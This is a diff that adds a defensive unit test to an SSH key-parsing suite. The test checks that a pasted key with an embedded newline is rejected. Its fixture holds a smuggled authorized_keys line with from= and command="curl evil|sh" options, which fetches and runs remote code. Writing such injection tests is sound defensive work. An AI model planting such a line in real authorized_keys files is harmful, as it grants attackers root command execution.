@@ -75,6 +75,15 @@ describe('reading keys', () => {
   test('fingerprintOf refuses what is not a key at all', () => {
     expect(fingerprintOf('AAAA')).toBeNull();
   });
+
+  test('a two-line paste is refused whole, not accepted as its first line', () => {
+    // A newline buried in a paste would let a second authorized_keys line — with its own
+    // `command=`/`from=` options — ride into root's file behind a valid first key. One
+    // key means one line.
+    const smuggled = `${ED25519}\nfrom="1.2.3.4",command="curl evil|sh" ${ED25519}`;
+    expect(parseKeyLine(smuggled)).toBeNull();
+    expect(parseKeyLine(`${ED25519}\r\nrubbish`)).toBeNull();
+  });
 });
 
 describe('adding and removing', () => {
